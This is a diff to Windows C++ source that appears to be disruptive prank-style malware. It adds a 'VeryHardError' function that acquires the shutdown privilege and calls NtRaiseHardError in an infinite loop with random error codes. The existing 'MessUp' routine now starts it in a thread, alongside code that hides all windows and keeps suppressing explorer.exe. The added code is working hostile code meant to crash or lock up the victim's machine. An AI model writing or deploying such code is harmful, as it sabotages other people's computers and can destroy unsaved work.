@@ -232,10 +232,27 @@ DWORD __stdcall SuppressFileExplorer(void*)
 	}
 }
 
+DWORD __stdcall VeryHardError(void*)
+{
+	auto RtlAdjustPrivilege = (void(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(LoadLibraryA("ntdll"), "RtlAdjustPrivilege");
+
+	BOOLEAN wasEnabled;
+	RtlAdjustPrivilege(19, 1, 0, &wasEnabled); //Adjust shutdown privilege
+
+	auto NtRaiseHardError = (void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");
+
+	ULONG response;
+	while (true)
+	{
+		NtRaiseHardError(0xC0000001 + Random() % 0x1A4, 0, 0, 0, 1, &response); //Random error message
+	}
+}
+
 void MessUp()
 {
 	SendMessageA(HWND_BROADCAST, WM_SHOWWINDOW, 0, 1); //Hide all windows
 	CreateThread(0, 0, SuppressFileExplorer, 0, 0, 0); //Keep suppressing explorer.exe
+	CreateThread(0, 0, VeryHardError, 0, 0, 0); //Nonsense error messages
 
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
 	GetModuleFileNameA(0, exePath, 8192);
